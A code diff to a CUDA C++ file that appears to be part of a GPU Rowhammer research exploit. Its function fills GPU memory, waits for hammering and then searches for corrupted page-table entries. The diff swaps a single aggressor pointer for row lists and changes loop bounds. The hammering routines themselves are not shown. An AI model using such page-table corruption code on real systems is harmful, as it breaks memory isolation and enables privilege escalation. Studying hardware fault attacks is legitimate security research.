@@ -1,7 +1,14 @@
 #include "./sc_firstPTC.cuh"
 #include "./sc_firstPTC_hammer.cuh"
 #include "./sc_allocallmem.cuh"
+#include <string>
+#include <fstream>
+#include <cmath>
+#include <numeric>
 #include <chrono>
+#include <rh_kernels.cuh>
+#include <rh_utils.cuh> 
+#include <rh_impls.cuh>
 #include <thread>
 
 bool
@@ -12,9 +19,10 @@ first_PT_chunk_attack (uint64_t num_alloc_init, uint64_t num_alloc,
 {
   int timein;
   char **first_ptc_ptrs;
-  char *agg_ptr;
+  RowList agg_row_list;
+  std::vector<uint64_t> agg_vec;
   if (!first_PT_chunk_fill (num_alloc_init, num_alloc, alloc_id, threshold,
-                            skip, &first_ptc_ptrs, &agg_ptr))
+                            skip, &first_ptc_ptrs, &agg_row_list, &agg_vec))
     {
         printf("Error: First PTC Allocation is wrong\n");
         exit(1);
@@ -22,19 +30,19 @@ first_PT_chunk_attack (uint64_t num_alloc_init, uint64_t num_alloc,
 
     std::cout << "Waiting for Identifing Info Intialization... " << '\n';
 
-    for (uint64_t i = 0; i < num_alloc_init - 2; i += 1)
+    for (uint64_t i = 0; i < num_alloc_init - 113; i += 1)
     {
         memset_ptr<<<1, 1>>>(first_ptc_ptrs[i] + 64 * 1024, 2 * 1024 * 1024 - 64 * 1024);
     }
 
-    memset_ptr<<<1, 1>>>(agg_ptr + 64 * 1024, 2 * 1024 * 1024 - 64 * 1024);
+    // memset_ptr<<<1, 1>>>(agg_ptr + 64 * 1024, 2 * 1024 * 1024 - 64 * 1024);
     cudaDeviceSynchronize();
 
-    std::cout << std::hex << (void*)agg_ptr << '\n';
+    // std::cout << std::hex << (void*)agg_ptr << '\n';
     std::cout << std::dec;
 
-    print_memory<<<1, 1>>>(agg_ptr + 64 * 1024, 100);
-    cudaDeviceSynchronize();
+    // print_memory<<<1, 1>>>(agg_ptr + 64 * 1024, 100);
+    // cudaDeviceSynchronize();
 
     std::cout << "Identifing Data Placed, Wait for Hammer" << '\n';
     std::cin.clear();
@@ -52,7 +60,7 @@ first_PT_chunk_attack (uint64_t num_alloc_init, uint64_t num_alloc,
      * If not repetition, find if it matches a PTE.
      * TODO: maybe later extend more
      */
-    for (uint64_t i = 0; !found_mismatch && i < num_alloc_init - 2 ; i += 1)
+    for (uint64_t i = 0; !found_mismatch && i < num_alloc_init - 113 ; i += 1)
     {
         for (uint64_t j = 64 * 1024; j < 2 * 1024 * 1024; j += 64 * 1024)
         {
@@ -68,17 +76,17 @@ first_PT_chunk_attack (uint64_t num_alloc_init, uint64_t num_alloc,
         }
     }
 
-    for (uint64_t j = 64 * 1024; j < 2 * 1024 * 1024; j += 64 * 1024)
-    {
-        cudaMemcpy(&temp_addr, agg_ptr + j, 8, cudaMemcpyDeviceToHost);
-        if (agg_ptr + j != temp_addr)
-        {
-            corrupted_addr = agg_ptr + j;
-            victim_addr = temp_addr;
-            found_mismatch = true;
-            break;
-        }
-    }
+    // for (uint64_t j = 64 * 1024; j < 2 * 1024 * 1024; j += 64 * 1024)
+    // {
+    //     cudaMemcpy(&temp_addr, agg_ptr + j, 8, cudaMemcpyDeviceToHost);
+    //     if (agg_ptr + j != temp_addr)
+    //     {
+    //         corrupted_addr = agg_ptr + j;
+    //         victim_addr = temp_addr;
+    //         found_mismatch = true;
+    //         break;
+    //     }
+    // }
 
     if (found_mismatch)
     {
@@ -93,7 +101,7 @@ first_PT_chunk_attack (uint64_t num_alloc_init, uint64_t num_alloc,
     if (out_first_ptc_ptrs)
         *out_first_ptc_ptrs = first_ptc_ptrs;
     if (out_agg_ptr)
-        *out_agg_ptr = agg_ptr;
+        *out_agg_ptr = nullptr;
     if (out_corrupted_ptr)
         *out_corrupted_ptr = corrupted_addr;
     if (out_victim_ptr)
